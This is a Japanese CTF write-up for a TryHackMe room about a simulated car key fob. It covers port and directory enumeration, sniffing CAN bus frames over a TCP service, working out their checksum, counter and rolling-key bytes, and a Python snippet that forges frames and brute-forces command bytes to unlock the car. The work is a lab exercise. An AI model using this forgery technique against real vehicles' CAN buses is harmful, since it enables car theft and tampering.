# Phantom Fob CTF

https://tryhackme.com/room/phantomfob

## Enumeration

```shell
TARGET=10.145.152.166
sudo bash -c "echo $TARGET   fob.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 64
8080/tcp  open  http-proxy syn-ack ttl 64
29536/tcp open  unknown    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,8080,29536 $TARGET

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
8080/tcp  open  http-proxy Werkzeug/3.1.8 Python/3.12.3
29536/tcp open  unknown
```

### ディレクトリ列挙

press, events 以外は発見できなかった。

```sh
root@ip-10-145-114-205:~# ffuf -u http://fob.thm:8080/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt

...
press                   [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 69ms]
                        [Status: 200, Size: 8678, Words: 378, Lines: 145, Duration: 58ms]
events                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 88ms]
:: Progress: [26584/26584] :: Job [1/1] :: 574 req/sec :: Duration: [0:01:05] :: Errors: 2 ::
```

## 8080

/events をリクエストすると、レスポンスが永久に送られ続ける。

```sh
curl http://fob.thm:8080/events

data: {"locked": true, "immob": true, "horn": false, "speed": 8.91, "turn": 0, "fps": 318, "seen_ids": 12, "flag": null}

data: {"locked": true, "immob": true, "horn": false, "speed": 26.77, "turn": 0, "fps": 318, "seen_ids": 12, "flag": null}

data: {"locked": true, "immob": true, "horn": false, "speed": 42.57, "turn": 0, "fps": 315, "seen_ids": 12, "flag": null}

data: {"locked": true, "immob": true, "horn": false, "speed": 54.6, "turn": 0, "fps": 313, "seen_ids": 12, "flag": null}
```

horn を押したとき

```http
POST /press HTTP/1.1
Host: fob.thm:8080
Content-Length: 17
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://fob.thm:8080
Referer: http://fob.thm:8080/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

{"button":"HORN"}


HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.12.3
Date: Mon, 14 Sep 2026 00:15:02 GMT
Content-Type: application/json
Content-Length: 23
Connection: close

{"msg":"OK","ok":true}
```

Immobiliser:Arm を押下

```json
{"button":"IMMOB_ARM"}

{"button":"IMMOB_DISARM"}
```

```json
{"button":"LOCK"}
```

lock 以外の名前発見できず。

```sh
root@ip-10-145-114-205:~# ffuf -u http://fob.thm:8080/press -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d '{"button":"FUZZ"}' -H 'Content-Type: application/json'

...
lock                    [Status: 200, Size: 23, Words: 1, Lines: 2, Duration: 71ms]
:: Progress: [2588/2588] :: Job [1/1] :: 546 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

button 以外のパラメータ名発見できず。

```sh
root@ip-10-145-114-205:~# ffuf -u http://fob.thm:8080/press -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d '{"FUZZ":"lock"}' -H 'Content-Type: application/json'

...
button                  [Status: 200, Size: 23, Words: 1, Lines: 2, Duration: 68ms]
:: Progress: [2588/2588] :: Job [1/1] :: 655 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

## CANバス

29536ポートは < hi > と表示される。CANバスのプロトコルとのこと。

```sh
$ nc fob.thm 29536                                                   
< hi >
```

下記のようにすると、フレームがストリーミングされる。名前はなんでも動作する模様。

```sh
< open vcan0 >
< ok >
< rawmode >
```

多すぎて訳が分からないので、基本的に変化しないフレームIDに注目。

```sh
$ python find_immutable.py
[+] Capturing CAN frames for 3.0 seconds to find STATIC IDs...

============================================================
 STATIC CAN IDs (No payload changes in 3.0s)
============================================================
CAN ID   | Count  | Constant Payload
------------------------------------------------------------
0x407    | 15     | 010100a500000000
0x4A0    | 60     | 0000000000000000
0x4FD    | 1      | 91cf4a20eba51f6f
------------------------------------------------------------
```

Lock連続押下時

```sh
0x4FD    | 91 34 f9 20 eb af 5d 6f -> 91 08 27 20 eb b0 a0 6f | 1789434164.223087
0x4FD    | 91 08 27 20 eb b0 a0 6f -> 91 74 a3 20 eb b1 59 6f | 1789434185.271125
0x4FD    | 91 74 a3 20 eb b1 59 6f -> 91 87 b5 20 eb b2 bf 6f | 1789434185.564693
0x4FD    | 91 87 b5 20 eb b2 bf 6f -> 91 86 b5 20 eb b3 bf 6f | 1789434185.870786
0x4FD    | 91 86 b5 20 eb b3 bf 6f -> 91 81 b5 20 eb b4 bf 6f | 1789434186.181106
0x4FD    | 91 81 b5 20 eb b4 bf 6f -> 91 0c 24 20 eb b5 a2 6f | 1789434186.471856
0x4FD    | 91 0c 24 20 eb b5 a2 6f -> 91 0f 24 20 eb b6 a2 6f | 1789434186.728539
0x4FD    | 91 0f 24 20 eb b6 a2 6f -> 91 32 f4 20 eb b7 4e 6f | 1789434186.964341
0x4FD    | 91 32 f4 20 eb b7 4e 6f -> 91 3d f4 20 eb b8 4e 6f | 1789434187.196213
0x4FD    | 91 3d f4 20 eb b8 4e 6f -> 91 3c f4 20 eb b9 4e 6f | 1789434187.445398
0x4FD    | 91 3c f4 20 eb b9 4e 6f -> 91 97 05 20 eb ba 17 6f | 1789434187.674659
0x4FD    | 91 97 05 20 eb ba 17 6f -> 91 96 05 20 eb bb 17 6f | 1789434187.925724
0x4FD    | 91 96 05 20 eb bb 17 6f -> 91 91 05 20 eb bc 17 6f | 1789434188.172834
0x4FD    | 91 91 05 20 eb bc 17 6f -> 91 bc fb 20 eb bd c5 6f | 1789434188.421267
0x4FD    | 91 bc fb 20 eb bd c5 6f -> 91 bf fb 20 eb be c5 6f | 1789434188.669083
0x4FD    | 91 bf fb 20 eb be c5 6f -> 91 be fb 20 eb bf c5 6f | 1789434188.916951
0x4FD    | 91 be fb 20 eb bf c5 6f -> 91 f1 3e 20 eb c0 30 6f | 1789434189.171524
0x4FD    | 91 f1 3e 20 eb c0 30 6f -> 91 f0 3e 20 eb c1 30 6f | 1789434189.668730
```

続いて、Hornを連続押下

```sh
0x4FD    | 91 f0 3e 20 eb c1 30 6f -> 91 6e 09 82 eb c2 38 6f | 1789434262.115978
0x4FD    | 91 6e 09 82 eb c2 38 6f -> 91 6f 09 82 eb c3 38 6f | 1789434262.356833
0x4FD    | 91 6f 09 82 eb c3 38 6f -> 91 d9 b6 82 eb c4 36 6f | 1789434262.594187
0x4FD    | 91 d9 b6 82 eb c4 36 6f -> 91 d8 b6 82 eb c5 36 6f | 1789434262.843842
0x4FD    | 91 d8 b6 82 eb c5 36 6f -> 91 db b6 82 eb c6 36 6f | 1789434263.074532
0x4FD    | 91 db b6 82 eb c6 36 6f -> 91 05 c9 82 eb c7 96 6f | 1789434263.328214
0x4FD    | 91 05 c9 82 eb c7 96 6f -> 91 0a c9 82 eb c8 96 6f | 1789434263.562752
0x4FD    | 91 0a c9 82 eb c8 96 6f -> 91 0b c9 82 eb c9 96 6f | 1789434263.805238
0x4FD    | 91 0b c9 82 eb c9 96 6f -> 91 06 bf 82 eb ca ee 6f | 1789434264.052886
0x4FD    | 91 06 bf 82 eb ca ee 6f -> 91 07 bf 82 eb cb ee 6f | 1789434264.289986
0x4FD    | 91 07 bf 82 eb cb ee 6f -> 91 00 bf 82 eb cc ee 6f | 1789434264.539827
0x4FD    | 91 00 bf 82 eb cc ee 6f -> 91 e3 e6 82 eb cd 55 6f | 1789434264.778980
0x4FD    | 91 e3 e6 82 eb cd 55 6f -> 91 e0 e6 82 eb ce 55 6f | 1789434265.037053
0x4FD    | 91 e0 e6 82 eb ce 55 6f -> 91 e1 e6 82 eb cf 55 6f | 1789434265.292310
0x4FD    | 91 e1 e6 82 eb cf 55 6f -> 91 26 33 82 eb d0 58 6f | 1789434265.537926
0x4FD    | 91 26 33 82 eb d0 58 6f -> 91 27 33 82 eb d1 58 6f | 1789434265.776865
0x4FD    | 91 27 33 82 eb d1 58 6f -> 91 da 0f 82 eb d2 9a 6f | 1789434266.073145
```

続いて、Arm

```sh
0x4FD    | 91 da 0f 82 eb d2 9a 6f -> 91 c0 11 eb eb d3 f6 6f | 1789434384.609408
0x4FD    | 91 c0 11 eb eb d3 f6 6f -> 91 c7 11 eb eb d4 f6 6f | 1789434384.853651
0x4FD    | 91 c7 11 eb eb d4 f6 6f -> 91 22 76 eb eb d5 75 6f | 1789434385.109113
0x4FD    | 91 22 76 eb eb d5 75 6f -> 91 21 76 eb eb d6 75 6f | 1789434385.351131
0x4FD    | 91 21 76 eb eb d6 75 6f -> 91 20 76 eb eb d7 75 6f | 1789434385.581541
0x4FD    | 91 20 76 eb eb d7 75 6f -> 91 7c 26 eb eb d8 76 6f | 1789434385.813668
0x4FD    | 91 7c 26 eb eb d8 76 6f -> 91 7d 26 eb eb d9 76 6f | 1789434386.061172
0x4FD    | 91 7d 26 eb eb d9 76 6f -> 91 7e 26 eb eb da 76 6f | 1789434386.312917
0x4FD    | 91 7e 26 eb eb da 76 6f -> 91 3a b3 eb eb db a6 6f | 1789434386.542974
0x4FD    | 91 3a b3 eb eb db a6 6f -> 91 3d b3 eb eb dc a6 6f | 1789434386.773984
0x4FD    | 91 3d b3 eb eb dc a6 6f -> 91 3c b3 eb eb dd a6 6f | 1789434386.997973
0x4FD    | 91 3c b3 eb eb dd a6 6f -> 91 15 08 eb eb de 37 6f | 1789434387.232699
0x4FD    | 91 15 08 eb eb de 37 6f -> 91 14 08 eb eb df 37 6f | 1789434387.455050
0x4FD    | 91 14 08 eb eb df 37 6f -> 91 2b 08 eb eb e0 37 6f | 1789434387.697768
0x4FD    | 91 2b 08 eb eb e0 37 6f -> 91 17 41 eb eb e1 43 6f | 1789434388.213324
```

続いて、disarm

```sh
0x4FD    | 91 17 41 eb eb e1 43 6f -> 91 3b d4 9a eb e2 88 6f | 1789434493.581420
0x4FD    | 91 3b d4 9a eb e2 88 6f -> 91 3a d4 9a eb e3 88 6f | 1789434493.856841
0x4FD    | 91 3a d4 9a eb e3 88 6f -> 91 3d d4 9a eb e4 88 6f | 1789434494.133209
0x4FD    | 91 3d d4 9a eb e4 88 6f -> 91 87 a9 9a eb e5 4e 6f | 1789434494.412979
0x4FD    | 91 87 a9 9a eb e5 4e 6f -> 91 84 a9 9a eb e6 4e 6f | 1789434494.698282
0x4FD    | 91 84 a9 9a eb e6 4e 6f -> 91 95 3e 9a eb e7 c9 6f | 1789434494.982861
0x4FD    | 91 95 3e 9a eb e7 c9 6f -> 91 9a 3e 9a eb e8 c9 6f | 1789434495.244789
0x4FD    | 91 9a 3e 9a eb e8 c9 6f -> 91 9b 3e 9a eb e9 c9 6f | 1789434495.481703
0x4FD    | 91 9b 3e 9a eb e9 c9 6f -> 91 ae 6b 9a eb ea aa 6f | 1789434495.755916
0x4FD    | 91 ae 6b 9a eb ea aa 6f -> 91 af 6b 9a eb eb aa 6f | 1789434496.023201
0x4FD    | 91 af 6b 9a eb eb aa 6f -> 91 a8 6b 9a eb ec aa 6f | 1789434496.260771
0x4FD    | 91 a8 6b 9a eb ec aa 6f -> 91 38 4e 9a eb ed 1e 6f | 1789434496.516781
0x4FD    | 91 38 4e 9a eb ed 1e 6f -> 91 3b 4e 9a eb ee 1e 6f | 1789434496.773017
0x4FD    | 91 3b 4e 9a eb ee 1e 6f -> 91 3a 4e 9a eb ef 1e 6f | 1789434497.021700
0x4FD    | 91 3a 4e 9a eb ef 1e 6f -> 91 7f 20 9a eb f0 2a 6f | 1789434497.260334
0x4FD    | 91 7f 20 9a eb f0 2a 6f -> 91 7e 20 9a eb f1 2a 6f | 1789434497.498761
0x4FD    | 91 7e 20 9a eb f1 2a 6f -> 91 7d 20 9a eb f2 2a 6f | 1789434497.718071
```

ペイロードを左から b0, b1, ... , b7 とすると、
- b0 = 91、b4 = eb, b7 = 6f は固定。
- b3 はコマンドの種類。（lock=20, horn=82, arm=eb, disarm=9a）
- b5 はカウンタで１ずつ増加。
- b2, b6 は連動しており、１秒程度で更新される。
- b1 の上位ビットは b2, b6 のタイミングに連動している。下位ビットの変化は不明。

b2（またはb6）が同じ１秒間程度のグループ内で、  
`b1 xor b2 xor b5` の値が固定になっている。

つまり b1 をチェックサムのようなものと考えると、`b1 xor b2 xor b5` でキーを入手し、１秒以内に `b2 xor b5 xor key` として b1 を計算できる。

コマンド番号が分かれば任意のペイロードを送れることになる。  
ただし、unlockのコマンド番号は不明というところが問題。

## VM再起動したらいろいろ動作が変わっていた・・・

```sh
0x2D5      | 0f 93 39 12 71 de 0d 5a | 1789447536.719815
```

lock

```sh
0x2D5    | be 93 39 12 73 de 2f e5 -> 24 93 39 12 74 de 49 30 | 1789447598.005219
0x2D5    | 24 93 39 12 74 de 49 30 -> a0 93 39 12 75 de 4c a8 | 1789447598.516059
0x2D5    | a0 93 39 12 75 de 4c a8 -> a1 93 39 12 76 de 4c a8 | 1789447598.846457
0x2D5    | a1 93 39 12 76 de 4c a8 -> ff 93 39 12 77 de a6 ab | 1789447599.137088
0x2D5    | ff 93 39 12 77 de a6 ab -> 00 93 39 12 78 de a6 ab | 1789447599.384141
```

horn

```sh
0x2D5    | 00 93 39 12 78 de a6 ab -> b2 93 39 7e 79 de 8c 0a | 1789447623.357015
0x2D5    | b2 93 39 7e 79 de 8c 0a -> b3 93 39 7e 7a de 8c 0a | 1789447623.636787
0x2D5    | b3 93 39 7e 7a de 8c 0a -> b4 93 39 7e 7b de 8c 0a | 1789447624.115767
0x2D5    | b4 93 39 7e 7b de 8c 0a -> 78 93 39 7e 7c de b5 a4 | 1789447624.331457
0x2D5    | 78 93 39 7e 7c de b5 a4 -> 79 93 39 7e 7d de b5 a4 | 1789447624.544306
0x2D5    | 79 93 39 7e 7d de b5 a4 -> 7a 93 39 7e 7e de b5 a4 | 1789447624.773954
```

arm

```sh
0x2D5    | 7a 93 39 7e 7e de b5 a4 -> 71 93 39 39 7f de ad e7 | 1789447648.749179
0x2D5    | 71 93 39 39 7f de ad e7 -> 77 93 39 39 80 de 09 90 | 1789447649.469736
0x2D5    | 77 93 39 39 80 de 09 90 -> 78 93 39 39 81 de 09 90 | 1789447649.730964
0x2D5    | 78 93 39 39 81 de 09 90 -> 79 93 39 39 82 de 09 90 | 1789447649.972068
0x2D5    | 79 93 39 39 82 de 09 90 -> 7a 93 39 39 83 de 09 90 | 1789447650.212724
0x2D5    | 7a 93 39 39 83 de 09 90 -> ef 93 39 39 84 de 32 db | 1789447655.061462
```

disarm

```sh
0x2D5    | ef 93 39 39 84 de 32 db -> f7 93 39 42 85 de bb 50 | 1789447681.774215
0x2D5    | f7 93 39 42 85 de bb 50 -> f8 93 39 42 86 de bb 50 | 1789447682.025686
0x2D5    | f8 93 39 42 86 de bb 50 -> f9 93 39 42 87 de bb 50 | 1789447682.225813
0x2D5    | f9 93 39 42 87 de bb 50 -> 84 93 39 42 88 de 39 5c | 1789447682.987267
0x2D5    | 84 93 39 42 88 de 39 5c -> 85 93 39 42 89 de 39 5c | 1789447683.171893
0x2D5    | 85 93 39 42 89 de 39 5c -> 86 93 39 42 8a de 39 5c | 1789447683.435694
```

- b1, b2, b5 が固定
- b3 はコマンドの種類。（コマンド値は変わっている）
- b4 はカウンタ(ctr)で１ずつ増加。
- b6, b7 は連動しており、１秒程度で更新される。
- b0 の上位ビットは b6, b7 のタイミングに連動している。下位ビットの変化は不明。

XORではなく、加算（mod 256）の関係があった。

```
b0 = (b3 + b4 + b6 + b7 + 0x25) mod 256
```

[ウォークスルーのコード](https://github.com/Mr-Destroyer/phantom-fob-tryhackme)を拝借して改造。実行したらWeb画面にフラグが表示された。

```python
    b0 = int(fd[0:2], 16)  # チェックサム
    b1 = int(fd[2:4], 16)  # 93
    b2 = int(fd[4:6], 16)  # 39
    cmd = int(fd[6:8], 16)  # コマンド
    ctr = int(fd[8:10], 16)  # カウンター
    b5 = int(fd[10:12], 16)  # de
    b6 = int(fd[12:14], 16)  # ブロックキー1
    b7 = int(fd[14:16], 16)  # ブロックキー2

    # 同じブロック(b6, b7)内で全コマンドバイト (0x00〜0xFF) をスイープ
    for i in range(256):
      c = (ctr + 1 + i) & 0xFF
      # b0 = (b3 + b4 + b6 + b7 + 0x25) mod 256
      b0n = (i + c + b6 + b7 + 0x25) & 0xFF

      # レイアウト: [b0n] [93] [39] [i] [c] [de] [b6] [b7]
      send_bus(
          inj,
          "2D5",
          "%02X%02X%02X%02X%02X%02X%02X%02X" % (b0n, b1, b2, i, c, b5, b6, b7),
      )
```

## 振り返り

- CANバスは完全に初見で勉強になった。
- ルールを発見するのは手作業ではしんどい。ツール化が必要。

## Tags

#tags:CANバス
